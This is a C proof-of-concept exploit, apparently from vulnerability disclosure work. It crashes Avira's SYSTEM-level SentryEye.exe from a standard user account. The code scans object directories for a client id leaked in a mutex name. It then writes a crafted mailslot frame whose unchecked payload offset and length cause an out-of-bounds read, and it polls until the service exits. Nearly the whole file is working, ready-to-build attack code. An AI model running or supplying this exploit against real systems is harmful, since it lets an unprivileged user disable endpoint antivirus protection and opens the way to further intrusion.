/*
 * sentry_eye_poc.exe - standard-user crash of Avira's SYSTEM SentryEye.exe.
 *
 * Tested: Avira Endpoint Protection SDK 1.0.2610.11290
 *         SentryEye.exe 3.0.2610.3768
 *         Windows 11 Pro 10.0.26300 (VM, UAC disabled)
 *         standard user (BUILTIN\Users, medium integrity)
 *         crash verified 2026-10-22 11:02:03: 0xc0000005 at SentryEye+0x3a4ef
 *
 * WHY IT WORKS
 *  - SentryEye's server mailslot DACL allows interactive users to write.
 *  - The client id is leaked in a world-readable mutex name.
 *  - The frame parser never checks payloadOffset + payloadLen against the
 *    datagram size, so a crafted frame reads ~4 GB past the buffer.
 *  - The fault happens inside SentryEye, so AM-PPL process protection
 *    (which only blocks external termination) does not apply.
 *
 * HOW IT WORKS (steps)
 *  1. Enumerate \BaseNamedObjects for SentryEye.Mutex.Running.{...}.<id>.
 *  2. Build the 256-byte frame: 0x40-byte header, payloadOffset=0xFFFF at
 *     0x38, payloadLen=0xFFFFFFFF at 0x3C, name at 0x40.
 *  3. Open \\.\mailslot\Axon\SentryEyeServer_<id> for GENERIC_WRITE.
 *  4. Write the frame; SentryEye faults and exits.
 *
 * Build: x64; see build.cmd. Usage: sentry_eye_poc.exe [client-id]
 * All log lines are printed to the terminal; when run from a console the
 * program pauses at the end and waits for any key. After sending, it polls
 * for up to 15 s for the target PID to exit (protected crash handling can
 * keep the process visible for a few seconds).
 * Authorized testing only. See reports/sentryeye-mailslot-crash.md.
 */

#define WIN32_LEAN_AND_MEAN
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>
#include <conio.h>
#include <stdlib.h>
#include <string.h>
#include <wchar.h>

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ((NTSTATUS)(s) >= 0)
#define STATUS_MORE_ENTRIES      ((NTSTATUS)0x80000005L)
#define STATUS_NO_MORE_ENTRIES   ((NTSTATUS)0x8000001AL)

typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _OBJECT_ATTRIBUTES {
    ULONG Length;
    HANDLE RootDirectory;
    PUNICODE_STRING ObjectName;
    ULONG Attributes;
    PVOID SecurityDescriptor;
    PVOID SecurityQualityOfService;
} OBJECT_ATTRIBUTES, *POBJECT_ATTRIBUTES;

typedef struct _OBJECT_DIRECTORY_INFORMATION {
    UNICODE_STRING Name;
    UNICODE_STRING TypeName;
} OBJECT_DIRECTORY_INFORMATION, *POBJECT_DIRECTORY_INFORMATION;

typedef NTSTATUS (NTAPI *FN_NtOpenDirectoryObject)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES);
typedef NTSTATUS (NTAPI *FN_NtQueryDirectoryObject)(HANDLE, PVOID, ULONG, BOOLEAN, BOOLEAN, PULONG, PULONG);

#define MAX_IDS 32
#define ID_CHARS 128

static int console_input(void)
{
    DWORD mode = 0;
    HANDLE h = GetStdHandle(STD_INPUT_HANDLE);
    return h != NULL && h != INVALID_HANDLE_VALUE && GetConsoleMode(h, &mode);
}

static void pause_exit(void)
{
    fflush(stdout);
    if (!console_input()) return;
    printf("\r\nPress any key to exit...\r\n");
    fflush(stdout);
    _getch();
}

/* Collect the PIDs of all running SentryEye.exe processes (-1 on error). */
static int find_sentry_pids(DWORD *pids, int max)
{
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32W pe;
    int n = 0;
    if (snap == INVALID_HANDLE_VALUE) return -1;
    ZeroMemory(&pe, sizeof(pe));
    pe.dwSize = sizeof(pe);
    if (Process32FirstW(snap, &pe)) {
        do {
            if (!_wcsicmp(pe.szExeFile, L"SentryEye.exe") && n < max)
                pids[n++] = pe.th32ProcessID;
        } while (Process32NextW(snap, &pe));
    }
    CloseHandle(snap);
    return n;
}

/* How many of the PIDs captured before the frame are still alive. */
static int count_alive(const DWORD *pids, int n)
{
    DWORD cur[64];
    int have = find_sentry_pids(cur, 64);
    int alive = 0;
    if (have < 0) return n; /* cannot tell; assume still alive */
    for (int i = 0; i < n; i++) {
        for (int j = 0; j < have; j++) {
            if (pids[i] == cur[j]) { alive++; break; }
        }
    }
    return alive;
}

/* Extract the client id from "...SentryEye.Mutex.Running.{GUID}.<id>" */
static void id_from_mutex(const wchar_t *name, wchar_t ids[][ID_CHARS], int *count)
{
    const wchar_t *mark = wcsstr(name, L"SentryEye.Mutex.Running.");
    const wchar_t *dot;
    size_t len;
    if (!mark) return;
    dot = wcsrchr(name, L'.');
    if (!dot || !dot[1]) return;
    if (dot < mark + 24) return;
    len = wcslen(dot + 1);
    if (len == 0 || len >= ID_CHARS) return;
    for (int i = 0; i < *count; i++) {
        if (!_wcsicmp(ids[i], dot + 1)) return;
    }
    if (*count >= MAX_IDS) return;
    wcscpy(ids[*count], dot + 1);
    (*count)++;
}

static int g_scanned;

static void scan_dir(const wchar_t *root, wchar_t ids[][ID_CHARS], int *count)
{
    HMODULE nt;
    FN_NtOpenDirectoryObject open_dir;
    FN_NtQueryDirectoryObject query_dir;
    UNICODE_STRING name;
    OBJECT_ATTRIBUTES oa;
    HANDLE dir = NULL;
    NTSTATUS st;
    BYTE buffer[4096];
    ULONG ctx = 0, ret = 0;
    int guard;

    nt = GetModuleHandleW(L"ntdll.dll");
    if (!nt) nt = LoadLibraryW(L"ntdll.dll");
    if (!nt) return;
    open_dir = (FN_NtOpenDirectoryObject)GetProcAddress(nt, "NtOpenDirectoryObject");
    query_dir = (FN_NtQueryDirectoryObject)GetProcAddress(nt, "NtQueryDirectoryObject");
    if (!open_dir || !query_dir) return;

    name.Buffer = (PWSTR)root;
    name.Length = (USHORT)(wcslen(root) * sizeof(WCHAR));
    name.MaximumLength = (USHORT)((wcslen(root) + 1) * sizeof(WCHAR));
    ZeroMemory(&oa, sizeof(oa));
    oa.Length = sizeof(oa);
    oa.ObjectName = &name;
    oa.Attributes = 0x40; /* OBJ_CASE_INSENSITIVE */

    st = open_dir(&dir, 0x0001 /* DIRECTORY_QUERY */, &oa);
    if (!NT_SUCCESS(st)) return;

    /* one entry at a time avoids array-layout differences between builds */
    for (guard = 0; guard < 100000; guard++) {
        POBJECT_DIRECTORY_INFORMATION info;
        st = query_dir(dir, buffer, sizeof(buffer), TRUE, FALSE, &ctx, &ret);
        if (st != 0) break; /* STATUS_NO_MORE_ENTRIES or an error */
        info = (POBJECT_DIRECTORY_INFORMATION)buffer;
        if (!info->Name.Buffer || !info->Name.Length) continue;
        {
            WCHAR tmp[512];
            ULONG chars = info->Name.Length / sizeof(WCHAR);
            if (chars >= 511) chars = 511;
            memcpy(tmp, info->Name.Buffer, chars * sizeof(WCHAR));
            tmp[chars] = 0;
            g_scanned++;
            id_from_mutex(tmp, ids, count);
        }
    }
    CloseHandle(dir);
}

static int discover_ids(wchar_t ids[][ID_CHARS])
{
    WCHAR session_root[64];
    DWORD sid = 0;
    int count = 0;

    scan_dir(L"\\BaseNamedObjects", ids, &count);
    if (ProcessIdToSessionId(GetCurrentProcessId(), &sid)) {
        swprintf(session_root, 64, L"\\Sessions\\%lu\\BaseNamedObjects", (unsigned long)sid);
        scan_dir(session_root, ids, &count);
    }
    return count;
}

static int send_frame(const wchar_t *id)
{
    unsigned char frame[256];
    char name[ID_CHARS + 32];
    char path[512];
    wchar_t wpath[512];
    HANDLE h;
    DWORD written = 0;
    BOOL ok;
    DWORD err;

    memset(frame, 0, sizeof(frame));
    *(unsigned int *)(frame + 0x00) = 0xAC503111u;  /* magic */
    *(unsigned int *)(frame + 0x04) = 2u;           /* version */
    *(unsigned int *)(frame + 0x08) = 3u;           /* flags */
    *(unsigned short *)(frame + 0x34) = 0x40;       /* header size */
    *(unsigned short *)(frame + 0x36) = 0;
    *(unsigned short *)(frame + 0x38) = 0xFFFF;     /* payloadOffset */
    *(unsigned int *)(frame + 0x3C) = 0xFFFFFFFFu;  /* payloadLen */

    snprintf(name, sizeof(name), "SentryEyeServer_%ls", id);
    strncpy((char *)(frame + 0x40), name, sizeof(frame) - 0x40 - 1);

    snprintf(path, sizeof(path), "\\\\.\\mailslot\\Axon\\SentryEyeServer_%ls", id);
    if (!MultiByteToWideChar(CP_ACP, 0, path, -1, wpath, 512)) return -1;

    printf("target: %s\n", path);
    printf("  frame: 256 bytes, payloadOffset=0xFFFF, payloadLen=0xFFFFFFFF\n");
    h = CreateFileW(wpath, GENERIC_WRITE,
                    FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                    NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        printf("  open failed: %lu\n", GetLastError());
        return -1;
    }
    ok = WriteFile(h, frame, sizeof(frame), &written, NULL);
    err = GetLastError();
    CloseHandle(h);
    printf("  write=%s len=%lu err=%lu\n", ok ? "ok" : "failed",
           (unsigned long)written, (unsigned long)err);
    return ok ? 0 : -1;
}

int main(int argc, char **argv)
{
    wchar_t ids[MAX_IDS][ID_CHARS];
    DWORD pids[16];
    DWORD after_pids[16];
    int count = 0;
    int before, after;
    int sent = 0;
    int exited = 0;
    DWORD waited = 0;

    setvbuf(stdout, NULL, _IONBF, 0);
    printf("Avira SentryEye mailslot crash PoC\n");

    before = find_sentry_pids(pids, 16);
    printf("SentryEye.exe running: %s", before < 0 ? "unknown" : (before ? "yes" : "no"));
    if (before > 0) {
        printf(" (pid");
        for (int i = 0; i < before; i++) printf(" %lu", (unsigned long)pids[i]);
        printf(")");
    }
    printf("\n");

    if (argc > 1) {
        MultiByteToWideChar(CP_ACP, 0, argv[1], -1, ids[0], ID_CHARS);
        count = 1;
    } else {
        count = discover_ids(ids);
        printf("objects scanned: %d, client ids found: %d\n", g_scanned, count);
    }
    if (count <= 0) {
        printf("no SentryEye client id found; is the Avira Endpoint Protection engine running?\n");
        pause_exit();
        return 2;
    }

    for (int i = 0; i < count; i++) {
        printf("id: %ls\n", ids[i]);
        if (send_frame(ids[i]) == 0) sent++;
    }

    if (before > 0 && sent > 0) {
        DWORD t0 = GetTickCount();
        printf("waiting up to 15 s for the target process to exit...\n");
        for (;;) {
            if (count_alive(pids, before) < before) { exited = 1; break; }
            waited = GetTickCount() - t0;
            if (waited >= 15000) break;
            Sleep(250);
        }
        waited = GetTickCount() - t0;
        printf("target state after %lu ms: %s\n", (unsigned long)waited,
               exited ? "exited" : "still running");
    }

    Sleep(500); /* let the process list settle before the final snapshot */
    after = find_sentry_pids(after_pids, 16);
    printf("SentryEye.exe running after: %s", after < 0 ? "unknown" : (after ? "yes" : "no"));
    if (after > 0) {
        printf(" (pid");
        for (int i = 0; i < after; i++) printf(" %lu", (unsigned long)after_pids[i]);
        printf(")");
    }
    printf("\n");
    printf("frames sent: %d\n", sent);
    if (before > 0 && exited)
        printf("RESULT: target SentryEye.exe exited after the frame (expected 0xc0000005 at +0x3a4ef)\n");
    else if (before == 0)
        printf("RESULT: no SentryEye instance was running; nothing to crash\n");
    else
        printf("RESULT: process still running after the wait\n");
    pause_exit();
    return 0;
}
